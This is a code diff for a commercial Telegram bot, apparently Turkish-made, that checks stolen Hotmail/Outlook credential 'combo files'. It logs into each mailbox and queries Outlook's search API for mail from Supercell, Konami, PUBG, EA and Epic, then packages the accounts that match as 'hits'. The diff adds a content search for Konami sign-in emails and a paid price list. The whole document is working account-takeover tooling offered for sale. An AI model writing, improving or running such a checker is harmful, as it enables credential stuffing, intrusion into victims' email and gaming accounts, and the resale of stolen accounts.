@@ -25,7 +25,7 @@ ZIP_FILE = "hotmailgamechecker.zip"
 
 GAME_EMAILS = {
     "supercell": {"email": "noreply@id.supercell.com", "file": "supercellbothits.txt", "label": "🎮 SUPERCELL"},
-    "konami": {"email": "konami-info@konami.net", "file": "konamibothits.txt", "label": "🕹️ KONAMI"},
+    "konami": {"email": "konami-info@konami.net", "file": "konamibothits.txt", "label": "🕹️ KONAMI", "content_search": "We have received your request to sign in to your KONAMI ID"},
     "pubg": {"email": "noreply@pubgmobile.com", "file": "pubgbothits.txt", "label": "🔫 PUBG"},
     "ea": {"email": "EA@e.ea.com", "file": "eabothits.txt", "label": "⚽ EA"},
     "epic": {"email": "help@acct.epicgames.com", "file": "epicbothits.txt", "label": "🎯 EPIC"},
@@ -125,7 +125,7 @@ def get_remaining_daily(chat_id):
     plan_info = get_plan_info(plan)
     daily_limit = plan_info["daily_limit"]
     if daily_limit == 0:
-        return 999999999  # Sınırsız
+        return 999999999
     user_id = str(chat_id)
     daily_used = users_db.get(user_id, {}).get("daily_used", 0)
     return daily_limit - daily_used
@@ -171,7 +171,7 @@ def generate_key(key_type):
     
     keys_db[key] = {
         "type": key_type,
-        "expires": None,  # Süre kullanılınca başlayacak
+        "expires": None,
         "bound_to": None,
         "created": datetime.now().isoformat()
     }
@@ -385,11 +385,17 @@ class marazali:
         except:
             return False
 
-    def search_sender_messages(self, tag, sender_email, token):
+    def search_messages(self, tag, game_key, token):
         try:
+            game_data = GAME_EMAILS[game_key]
+            
+            if "content_search" in game_data:
+                query = game_data["content_search"]
+            else:
+                query = f'from:"{game_data["email"]}"'
+            
             url = "https://outlook.live.com/search/api/v2/query"
             params = {"n": "124", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"}
-            query = f'from:"{sender_email}"'
             body = {
                 "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                 "Scenario": {"Name": "owa.react"},
@@ -481,8 +487,7 @@ class marazali:
         mesaj_info = {}
         
         for game_key, game_data in GAME_EMAILS.items():
-            sender = game_data["email"]
-            sayi, tarih = self.search_sender_messages(tag, sender, token)
+            sayi, tarih = self.search_messages(tag, game_key, token)
             mesaj_info[game_key] = {
                 "sayi": sayi,
                 "tarih": tarih.strftime('%Y-%m-%d %H:%M:%S') if tarih else 'N/A'
@@ -544,6 +549,7 @@ def ana_menu(chat_id):
              {"text": "📂 Multi Scan", "callback_data": "multi_start"}],
             [{"text": "📊 Status", "callback_data": "durum"},
              {"text": "🔑 Enter Key", "callback_data": "key_giris"}],
+            [{"text": "💰 Prices", "callback_data": "fiyatlar"}],
         ]
     }
     
@@ -563,6 +569,18 @@ def ana_menu(chat_id):
     text += f"⚡ Thread: {thread}\n"
     
     send_message(chat_id, text, keyboard)
+
+def fiyat_menu(chat_id):
+    text = (
+        f"💰 PRICE LIST\n\n"
+        f"📋 PLANS:\n"
+        f"────────────────────────────\n"
+        f"Daily: 750 TCoin\n"
+        f"Weekly: 3.000 TCoin\n"
+        f"Monthly: 9.000 TCoin\n\n"
+        f"💡 Contact: {ADMIN_USERNAME}"
+    )
+    send_message(chat_id, text)
 
 def durum_menu(chat_id):
     if str(chat_id) == str(ADMIN_ID):
@@ -723,8 +741,7 @@ def duyuru(chat_id, mesaj):
             send_message(int(user_id), f"📢 ANNOUNCEMENT\n\n{mesaj}")
             gonderilen += 1
         except:
-            pass
-    
+            pass    
     send_message(chat_id, f"✅ Announcement sent to {gonderilen} users.")
 
 def bakim(chat_id):
@@ -878,7 +895,6 @@ def tarama_yap(chat_id, accounts, dosya_adi):
     if zip_olustu:
         send_document(chat_id, ZIP_FILE)
     
-    # Bekleyen hesap varsa bildir
     if chat_id in bekleyen_hesaplar and bekleyen_hesaplar[chat_id].get("accounts"):
         kalan_sayi = len(bekleyen_hesaplar[chat_id]["accounts"])
         send_message(chat_id, f"📂 {kalan_sayi} more accounts remaining. Type /devam to continue.")
@@ -905,6 +921,8 @@ def telegram_bot():
                             ana_menu(chat_id)
                         elif data_cb == "durum":
                             durum_menu(chat_id)
+                        elif data_cb == "fiyatlar":
+                            fiyat_menu(chat_id)
                         elif data_cb == "baslat":
                             send_message(chat_id, "📂 Send your combo file. Scanning will start automatically.")
                         elif data_cb == "multi_start":
@@ -1071,7 +1089,6 @@ def telegram_bot():
                             
                             keys_db[key]["bound_to"] = str(chat_id)
                             
-                            # Süre kullanılınca başlar
                             if not key_data.get("expires"):
                                 duration_hours = PLANS[key_data["type"]]["duration"]
                                 if duration_hours:
